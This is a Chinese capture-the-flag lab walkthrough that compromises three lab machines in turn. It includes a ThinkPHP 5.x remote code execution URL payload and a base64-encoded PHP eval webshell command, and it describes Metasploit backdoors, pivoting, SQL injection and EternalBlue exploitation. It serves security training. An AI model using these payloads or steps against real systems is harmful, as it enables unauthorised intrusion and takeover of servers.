# CFS三层靶机搭建及其内网渗透附靶场环境

## 译文声明
本文为翻译文章，具体内容及含义以原文为准。译文仅供参考。

## 0x00 前言
最近要参加的一场CTF线下赛采用了CFS靶场模式。据官方介绍，CFS靶场即三层靶机的内网渗透，通过逐层渗透获取每台靶机上的flag以得分。因此，我决定先自行搭建一个练习环境。三台靶机的OVA文件下载地址，请关注我的公众号“TeamsSix”，并回复“CFS”以获取链接。
在每台主机中，我都放置了多个flag。本文将详细介绍每个靶机的攻击过程，但不会讨论具体的flag获取方法，这需要读者自己动手寻找。若想确认找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”中回复“flag”来获取答案。

## 0x01 环境搭建
我简单绘制了网络拓扑图，攻击机的IP地址设置为192.168.1.1/24，而三台靶机的具体IP分配如图1所示。VMware中的三个网卡分别配置为桥接、仅主机和仅主机模式，具体子网地址见图2。若要在个人电脑上复现此靶场环境，请先将VMware虚拟网络编辑器调整至图2所示状态，然后导入三台靶机的OVA文件，并手动分配其IP地址，使其符合图1设定。

**注意：** 桥接模式下的网卡应设置为你能够连接互联网的实际网卡，因为自动配置有时会导致虚拟机无法访问外部网络。

## 0x02 Target1

### a、获取shell
1. 使用nmap扫描Target1：
   ```bash
   root@kali:~# nmap -T4 -O 192.168.1.11
   ```
   扫描结果显示Target1开放了ftp、ssh、http等端口，并运行着Linux操作系统。
   
2. 访问http服务，发现是一个基于ThinkPHP 5.X框架的应用程序。
3. 利用该版本框架中存在的远程命令执行漏洞进行测试：
   ```php
   /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
   ```
4. 成功触发PHPinfo页面后，利用工具写入一句话木马尝试获取shell。如果直接echo语句失败，则尝试Base64编码上传：
   ```bash
   echo "PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==" | base64 -d > shell.php
   ```
5. 验证shell.php成功上传且可执行后，使用蚁剑连接目标机器，随后设置代理以便进一步渗透第二层。

### b、设置代理
1. 根据自身IP生成适用于Target1系统的后门文件（例如ELF格式）并通过蚁剑上传至服务器。
2. 在Kali Linux中启动Metasploit监听模块，等待来自Target1的反向连接。
3. 获取到Meterpreter会话后，添加通往Target2所在子网的路由。
4. 在Kali Linux上开启Socks4a代理服务，并修改`proxychains-ng`配置文件以支持代理链路。
5. 通过代理链路使用nmap对Target2进行初步探测。

## 0x03 Target2

### a、获取shell
1. 通过浏览器访问Target2提供的Web服务，查找可能存在的脆弱点。
2. 利用SQL注入技术配合sqlmap工具枚举数据库信息，包括表名、列名及敏感数据（如管理员账号密码）。
3. 登录后台管理系统，找到文件上传功能，插入恶意代码以获取新的shell。
4. 重复上述步骤，在Target2上创建bind_tcp类型的后门，并通过Meterpreter与之建立稳定连接。
5. 添加指向第三层靶机所在子网的路由规则。

### b、设置代理
无需额外设置代理，直接利用已有的Meterpreter会话即可访问下一跳。

## 0x03 Target3

### a、获取shell
1. 识别出Target3是一台Windows系统，开放了445、3389端口。
2. 使用永恒之蓝漏洞（MS17-010）针对SMB服务发起攻击，获得初始访问权限。
3. 通过Meterpreter更改Administrator账户密码，并启用远程桌面连接功能。

## 0x04 总结
至此，三台靶机均已被攻破。建议读者亲自实践，独立完成整个流程并寻找隐藏于各处的flag。关于flag的具体位置将在我的公众号“TeamsSix”中公布。此外，我还总结了一些在实验过程中遇到的问题及其解决方案，希望对你有所帮助。感谢以下参考资料作者们的无私分享：

- [zerlong.com](http://zerlong.com/512.html)
- [anquanke.com](https://www.anquanke.com/post/id/170649)
- [anquanke.com](https://www.anquanke.com/post/id/164525)
- [CSDN博客](https://blog.csdn.net/qq_36711453/article/details/84977739)